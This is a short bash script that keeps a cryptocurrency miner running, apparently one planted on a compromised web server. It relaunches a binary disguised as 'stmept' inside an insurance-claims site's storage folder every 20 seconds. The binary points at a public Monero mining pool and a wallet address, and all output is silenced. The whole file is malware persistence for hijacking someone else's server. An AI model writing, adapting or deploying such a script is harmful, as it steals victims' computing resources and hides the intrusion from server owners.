#!/bin/bash
while true; do
    if ! pgrep -f "stmept" >/dev/null; then
        "/var/www/html/qps-insurance-claims/storage/stmept" --url "pool.supportxmr.com:3333" --user "8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK" --pass next --donate-level 0 >/dev/null 2>&1 &
    fi
    sleep 20
done
